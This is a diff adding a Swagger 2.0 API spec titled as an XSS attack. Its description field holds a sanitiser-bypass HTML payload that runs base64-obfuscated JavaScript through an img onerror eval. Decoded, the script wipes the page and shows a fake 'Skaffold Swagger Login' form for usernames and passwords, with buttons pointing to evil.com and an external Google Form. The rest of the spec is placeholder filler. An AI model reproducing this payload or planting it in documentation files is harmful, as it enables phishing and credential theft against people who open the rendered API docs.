@@ -1,0 +1,27 @@
+swagger: '2.0'
+info:
+  title: XSS Attack BY olive_cipher
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>
+    <img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBmPWZvcm0oKTsKZnVuY3Rpb24gZm9ybSgpIHsKICB2YXIgdj1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjZW50ZXIiKTsKICB2LmlubmVySFRNTD0nPGI+U2thZmZvbGQgU3dhZ2dlciBMb2dpbjwvYj48YnI+VXNlcm5hbWU6IDxpbnB1dCBuYW1lPSJ1c2VyIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCBuYW1lPSJwd2QiIHR5cGU9InBhc3N3b3JkIj48YnI+JzsKICB2YXIgbD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJidXR0b24iKTsKICBsLnRleHRDb250ZW50PSAiTG9naW4iOwogIGwub25jbGljaz1mdW5jdGlvbigpeyB3aW5kb3cubG9jYXRpb24uaHJlZj0naHR0cDovL2V2aWwuY29tJzsgfTsKICB2YXIgcz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJidXR0b24iKTsKICBzLnRleHRDb250ZW50PSAiU2lnbiB1cCI7CiAgcy5vbmNsaWNrPWZ1bmN0aW9uKCl7IHdpbmRvdy5vcGVuKCJodHRwczovL2RvY3MuZ29vZ2xlLmNvbS9mb3Jtcy9kL2UvMUZBSXBRTFNkelRjN0pqNkhnUGR1eHk1UmlzUGh5MWlhQUFzSTZENUhvYXMxRWpzUUt1MWVEUS92aWV3Zm9ybT91c3A9cmVxdWlyZWQiLCJfYmxhbmsiKTsgfTsKICB2LmFwcGVuZENoaWxkKGwpOwogIHYuYXBwZW5kQ2hpbGQocyk7CiAgcmV0dXJuIHY7Cn0KZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmKCkpOw==' onerror='eval(atob(this.id))'>
+    ">
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /olive_cipher:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - olive_cipher_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
